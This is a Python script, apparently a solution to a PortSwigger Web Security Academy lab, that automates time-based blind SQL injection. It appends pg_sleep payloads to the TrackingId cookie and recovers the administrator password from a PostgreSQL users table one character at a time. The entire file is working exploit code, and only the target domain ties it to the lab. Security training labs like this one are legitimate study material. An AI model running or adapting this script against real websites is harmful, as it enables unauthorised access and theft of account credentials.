#!/bin/python3

import requests
import time 
import string

DOMAIN = "ac851fe51fee8432c01492990079005d.web-security-academy.net"
LAB_URL = f"https://{DOMAIN}/"


def valueFound(response):
    return response.elapsed.total_seconds() >= 10


def findPasswordLength(session):
    response = session.get(LAB_URL)
    cookies = session.cookies.get_dict() 
    trackingId = cookies["TrackingId"]
    passwordLength = 0
    while not valueFound(response):
        passwordLength += 1
        sqliPayload = f"'||(SELECT CASE WHEN (LENGTH(password)={passwordLength}) THEN pg_sleep(15) ELSE NULL END FROM users WHERE username='administrator')||'"
        evilTrackingId = trackingId + sqliPayload
        cookies["TrackingId"] = evilTrackingId
        response = session.get(LAB_URL, cookies=cookies)
        time.sleep(1)

    return passwordLength


def findPassword(session, passwordLength):
    session.get(LAB_URL)
    cookies = session.cookies.get_dict()
    trackingId = cookies["TrackingId"]
    posicion = 0
    running = True
    characters = string.digits \
               + string.ascii_letters \
               + string.punctuation
    characterIndex = 0
    password = ""
    while (running):
        sqliPayload = f"'||(SELECT CASE WHEN (SUBSTRING(password,{posicion + 1},1)='{characters[characterIndex]}') THEN pg_sleep(15) ELSE NULL END FROM users WHERE username='administrator')||'"
        evilTrackingId = trackingId + sqliPayload
        print(evilTrackingId)
        cookies["TrackingId"] = evilTrackingId
        response = session.get(LAB_URL, cookies=cookies)
        
        if (valueFound(response)):
            password += characters[characterIndex]
            characterIndex = -1
            posicion += 1

        elif (characterIndex == len(characters) - 1):
            running = False
            
        if (posicion == passwordLength):
            running = False
        
        characterIndex += 1
        time.sleep(1)

    return password


def main():
    with requests.session() as session:
        passwordLength = 20#findPasswordLength(session)
        password = findPassword(session, passwordLength)
        if (len(password) == passwordLength):
            print("[+] " + password)

        else:
            print("[-] Password not found.")


if __name__ == "__main__":
    main()
